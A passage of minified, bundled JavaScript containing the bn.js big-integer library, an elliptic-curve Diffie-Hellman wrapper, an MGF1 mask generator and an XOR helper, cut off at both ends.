                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn$2)
    }(bn$3)),
    bn$3.exports
}
var browser$5, hasRequiredBrowser$5;
function requireBrowser$5() {
    if (hasRequiredBrowser$5)
        return browser$5;
    hasRequiredBrowser$5 = 1;
    var _ = requireElliptic()
      , M = requireBn$1();
    browser$5 = function(b) {
        return new O(b)
    }
    ;
    var j = {
        secp256k1: {
            name: "secp256k1",
            byteLength: 32
        },
        secp224r1: {
            name: "p224",
            byteLength: 28
        },
        prime256v1: {
            name: "p256",
            byteLength: 32
        },
        prime192v1: {
            name: "p192",
            byteLength: 24
        },
        ed25519: {
            name: "ed25519",
            byteLength: 32
        },
        secp384r1: {
            name: "p384",
            byteLength: 48
        },
        secp521r1: {
            name: "p521",
            byteLength: 66
        }
    };
    j.p224 = j.secp224r1,
    j.p256 = j.secp256r1 = j.prime256v1,
    j.p192 = j.secp192r1 = j.prime192v1,
    j.p384 = j.secp384r1,
    j.p521 = j.secp521r1;
    function O(w) {
        this.curveType = j[w],
        this.curveType || (this.curveType = {
            name: w
        }),
        this.curve = new _.ec(this.curveType.name),
        this.keys = void 0
    }
    O.prototype.generateKeys = function(w, b) {
        return this.keys = this.curve.genKeyPair(),
        this.getPublicKey(w, b)
    }
    ,
    O.prototype.computeSecret = function(w, b, X) {
        b = b || "utf8",
        Buffer.isBuffer(w) || (w = new Buffer(w,b));
        var Y = this.curve.keyFromPublic(w).getPublic()
          , F = Y.mul(this.keys.getPrivate()).getX();
        return x(F, X, this.curveType.byteLength)
    }
    ,
    O.prototype.getPublicKey = function(w, b) {
        var X = this.keys.getPublic(b === "compressed", !0);
        return b === "hybrid" && (X[X.length - 1] % 2 ? X[0] = 7 : X[0] = 6),
        x(X, w)
    }
    ,
    O.prototype.getPrivateKey = function(w) {
        return x(this.keys.getPrivate(), w)
    }
    ,
    O.prototype.setPublicKey = function(w, b) {
        return b = b || "utf8",
        Buffer.isBuffer(w) || (w = new Buffer(w,b)),
        this.keys._importPublic(w),
        this
    }
    ,
    O.prototype.setPrivateKey = function(w, b) {
        b = b || "utf8",
        Buffer.isBuffer(w) || (w = new Buffer(w,b));
        var X = new M(w);
        return X = X.toString(16),
        this.keys = this.curve.genKeyPair(),
        this.keys._importPrivate(X),
        this
    }
    ;
    function x(w, b, X) {
        Array.isArray(w) || (w = w.toArray());
        var Y = new Buffer(w);
        if (X && Y.length < X) {
            var F = new Buffer(X - Y.length);
            F.fill(0),
            Y = Buffer.concat([F, Y])
        }
        return b ? Y.toString(b) : Y
    }
    return browser$5
}
var browser$4 = {}, mgf, hasRequiredMgf;
function requireMgf() {
    if (hasRequiredMgf)
        return mgf;
    hasRequiredMgf = 1;
    var _ = requireBrowser$b()
      , M = requireSafeBuffer$1().Buffer;
    mgf = function(O, x) {
        for (var w = M.alloc(0), b = 0, X; w.length < x; )
            X = j(b++),
            w = M.concat([w, _("sha1").update(O).update(X).digest()]);
        return w.slice(0, x)
    }
    ;
    function j(O) {
        var x = M.allocUnsafe(4);
        return x.writeUInt32BE(O, 0),
        x
    }
    return mgf
}
var xor, hasRequiredXor;
function requireXor() {
    return hasRequiredXor || (hasRequiredXor = 1,
    xor = function(M, j) {
        for (var O = M.length, x = -1; ++x < O; )
            M[x] ^= j[x];
        return M
    }
    ),
    xor
}
var bn$1 = {
    exports: {}
}, bn = bn$1.exports, hasRequiredBn;
function requireBn() {
    return hasRequiredBn || (hasRequiredBn = 1,
    function(_) {
        (function(M, j) {
            function O(ce, q) {
                if (!ce)
                    throw new Error(q || "Assertion failed")
            }
            function x(ce, q) {
                ce.super_ = q;
                var L = function() {};
                L.prototype = q.prototype,
                ce.prototype = new L,
                ce.prototype.constructor = ce
            }
            function w(ce, q, L) {
                if (w.isBN(ce))
                    return ce;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                ce !== null && ((q === "le" || q === "be") && (L = q,
                q = 10),
                this._init(ce || 0, q || 10, L || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(q) {
                return q instanceof w ? !0 : q !== null && typeof q == "object" && q.constructor.wordSize === w.wordSize && Array.isArray(q.words)
            }
            ,
            w.max = function(q, L) {
                return q.cmp(L) > 0 ? q : L
            }
            ,
            w.min = function(q, L) {
                return q.cmp(L) < 0 ? q : L
            }
            ,
            w.prototype._init = function(q, L, U) {
                if (typeof q == "number")
                    return this._initNumber(q, L, U);
                if (typeof q == "object")
                    return this._initArray(q, L, U);
                L === "hex" && (L = 16),
                O(L === (L | 0) && L >= 2 && L <= 36),
                q = q.toString().replace(/\s+/g, "");
                var Z = 0;
                q[0] === "-" && (Z++,
                this.negative = 1),
                Z < q.length && (L === 16 ? this._parseHex(q, Z, U) : (this._parseBase(q, L, Z),
                U === "le" && this._initArray(this.toArray(), L, U)))
            }
            ,
            w.prototype._initNumber = function(q, L, U) {
                q < 0 && (this.negative = 1,
                q = -q),
                q < 67108864 ? (this.words = [q & 67108863],
                this.length = 1) : q < 4503599627370496 ? (this.words = [q & 67108863, q / 67108864 & 67108863],
                this.length = 2) : (O(q < 9007199254740992),
                this.words = [q & 67108863, q / 67108864 & 67108863, 1],
                this.length = 3),
                U === "le" && this._initArray(this.toArray(), L, U)
            }
            ,
            w.prototype._initArray = function(q, L, U) {
                if (O(typeof q.length == "number"),
                q.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(q.length / 3),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te, se, de = 0;
                if (U === "be")
                    for (Z = q.length - 1,
                    te = 0; Z >= 0; Z -= 3)
                        se = q[Z] | q[Z - 1] << 8 | q[Z - 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                else if (U === "le")
                    for (Z = 0,
                    te = 0; Z < q.length; Z += 3)
                        se = q[Z] | q[Z + 1] << 8 | q[Z + 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                return this.strip()
            }
            ;
            function X(ce, q) {
                var L = ce.charCodeAt(q);
                return L >= 65 && L <= 70 ? L - 55 : L >= 97 && L <= 102 ? L - 87 : L - 48 & 15
            }
            function Y(ce, q, L) {
                var U = X(ce, L);
                return L - 1 >= q && (U |= X(ce, L - 1) << 4),
                U
            }
            w.prototype._parseHex = function(q, L, U) {
                this.length = Math.ceil((q.length - L) / 6),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te = 0, se = 0, de;
                if (U === "be")
                    for (Z = q.length - 1; Z >= L; Z -= 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8;
                else {
                    var re = q.length - L;
                    for (Z = re % 2 === 0 ? L + 1 : L; Z < q.length; Z += 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8
                }
                this.strip()
            }
            ;
